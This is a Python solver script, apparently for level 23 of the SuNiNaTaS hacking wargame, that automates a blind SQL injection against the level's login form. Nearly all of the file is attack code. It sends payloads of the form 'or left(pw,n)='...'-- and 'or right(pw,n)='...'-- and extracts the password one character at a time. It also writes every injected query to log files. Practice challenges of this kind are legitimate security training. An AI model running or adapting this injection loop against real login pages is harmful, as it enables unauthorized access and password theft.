import requests

login_url = 'http://suninatas.com/member/mem_action.asp'
with requests.Session() as s:
    main_login = {'Hid': '', 'Hpw': ''}

    main_login_req = s.post(login_url, data=main_login)

    if main_login_req.status_code != 200:
        raise Exception('connection error')
    
    #로그인 세션 유지

    
    level23 = 'http://suninatas.com/Part_one/web23/web23.asp'
    login = {'id':'', 'pw':1234} # login data

    password = 'V3'
    log = ''
    # blind sql injection query
    str1 = "'or left(pw,"
    column = 3
    str2 = ")='"
    alphabet = 32 # space
    str3 = "'--"
    while(column <= 10): # loop for column
        log += 'column : ' + str(column) + '\n'
        while(alphabet <= 126): # loop for alphabet
            # upper case
            str_id = str1 + str(column) + str2 + password + chr(alphabet) + str3
            login['id'] = str_id
            req = s.post(level23, data=login)
            log += 'query : ' + str_id + '\n'
            if 'OK' in req.text:
                password += chr(alphabet)
                break
            
            alphabet += 1
        log += 'password : ' +  str(password) + '\n'
        alphabet = 32
        column += 1
    
    with open('level23-left.txt', 'w') as f:
        f.write(log)

    password = 'I'
    log = ''
    # blind sql injection query
    str1 = "'or right(pw,"
    column = 2
    str2 = ")='"
    alphabet = 32 # space
    str3 = "'--"
    while(column <= 10): # loop for column
        log += 'column : ' + str(column) + '\n'
        while(alphabet <= 126): # loop for alphabet
            # upper case
            str_id = str1 + str(column) + str2 + chr(alphabet) + password + str3
            login['id'] = str_id
            req = s.post(level23, data=login)
            log += 'query : ' + str_id + '\n'
            if 'OK' in req.text:
                password = chr(alphabet) + password
                break
            
            alphabet += 1
        log += 'password : ' +  str(password) + '\n'
        alphabet = 32
        column += 1
    
    with open('level23-right.txt', 'w') as f:
        f.write(log)

    print('done')